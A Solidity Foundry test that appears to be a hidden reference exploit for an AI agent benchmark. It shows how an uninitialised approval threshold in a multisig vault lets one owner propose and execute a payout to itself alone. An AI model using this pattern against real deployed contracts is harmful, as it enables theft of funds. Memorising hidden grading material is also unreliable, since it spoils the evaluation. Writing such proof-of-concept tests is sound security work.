// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/CosignVault.sol";

// Reference exploit for the Slither lead `uninitialized-state` on `CosignVault.required`.
// The agent never sees this folder. `required` is never set, so it is 0: one owner of
// three proposes a payout to itself and executes it with no approval.
contract CosignVaultTest is Test {
    function test_oneOwnerPaysOutAlone() public {
        address rogue = address(0xBAD);
        address[] memory owners = new address[](3);
        owners[0] = rogue;
        owners[1] = address(0xA11CE);
        owners[2] = address(0xB0B);
        CosignVault vault = new CosignVault(owners);
        vm.deal(address(vault), 1 ether);
        vm.startPrank(rogue);
        uint256 id = vault.propose(payable(rogue), 1 ether);
        vault.execute(id);
        vm.stopPrank();
        assertEq(rogue.balance, 1 ether);
        assertEq(address(vault).balance, 0);
    }
}
